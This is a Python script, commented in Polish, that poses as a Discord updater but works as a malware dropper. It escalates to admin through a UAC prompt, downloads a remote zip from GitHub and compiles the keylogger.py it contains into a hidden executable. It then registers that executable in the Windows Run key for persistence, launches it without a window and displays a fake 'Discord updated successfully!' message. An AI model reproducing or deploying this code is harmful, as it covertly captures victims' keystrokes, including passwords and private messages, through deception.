import os
import sys
import winreg
import shutil
import ctypes
import requests
import tempfile
import zipfile
import subprocess

# Konfiguracja
REPO_URL = "https://github.com/ITDarknes1702/DiscordUpdater/releases/download/v2.4/DiscordUpdater-main.zip"
INSTALL_DIR = os.path.join(os.getenv('APPDATA'), 'Discord_Update')
EXE_NAME = "discordUpdate.exe"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_and_extract():
    try:
        # Pobierz repo jako zip
        response = requests.get(REPO_URL)
        response.raise_for_status()
        
        # Zapisz do pliku tymczasowego
        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp_file:
            tmp_file.write(response.content)
            tmp_path = tmp_file.name
        
        # Wypakuj
        with zipfile.ZipFile(tmp_path, 'r') as zip_ref:
            zip_ref.extractall(INSTALL_DIR)
        
        os.remove(tmp_path)
        return True
    except Exception as e:
        print(f"Download error: {e}")
        return False

def add_to_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        exe_path = os.path.join(INSTALL_DIR, EXE_NAME)
        winreg.SetValueEx(key, "DiscordUpdater", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Registry error: {e}")

def install():
    try:
        # 1. Pobierz i wypakuj
        if not download_and_extract():
            return False

        # 2. Skompiluj keylogger
        keylogger_path = os.path.join(INSTALL_DIR, "DiscordUpdater-main", "keylogger.py")
        subprocess.run([
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--noconsole",
            f"--name={EXE_NAME}",
            "--distpath", INSTALL_DIR,
            keylogger_path
        ], check=True)

        # 3. Dodaj do autostartu
        add_to_startup()

        # 4. Uruchom
        exe_path = os.path.join(INSTALL_DIR, EXE_NAME)
        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)

        # 5. Komunikat
        ctypes.windll.user32.MessageBoxW(0, "Discord updated successfully!", "Update", 0x40)
        
        return True
    except Exception as e:
        print(f"Install error: {e}")
        return False

if __name__ == "__main__":
    if is_admin():
        if install():
            print("Installation completed!")
        else:
            print("Installation failed!")
            input("Press Enter to exit...")
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)